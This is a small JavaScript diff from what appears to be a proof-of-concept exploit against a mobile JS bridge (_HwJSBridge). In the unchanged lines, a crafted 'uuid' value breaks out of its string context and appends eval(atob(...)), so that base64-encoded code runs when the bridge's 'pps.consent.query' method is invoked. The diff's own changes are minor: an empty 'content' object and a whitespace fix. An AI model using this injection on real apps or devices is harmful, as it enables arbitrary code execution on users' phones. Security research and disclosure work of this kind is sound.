@@ -28,6 +28,7 @@
                 setTimeout(function () {
                     if (window._HwJSBridge && typeof window._HwJSBridge.invokeAsync === "function") {
                         var payload2 = '\'},\'*\');}}};' + `eval(atob("${base64}"));//`;
+                        var content = {};
                         var data = {
                             'content': JSON.stringify(content),
                             'url': 'https://www.baidu.com',
@@ -36,7 +37,7 @@
                             'uuid': payload2
                         };
                         window._HwJSBridge.invokeAsync('pps.consent.query', JSON.stringify(data), '123');
-                    }else{
+                    } else {
                         alert('no _HwJSBridge')
                     }
                 }, i);
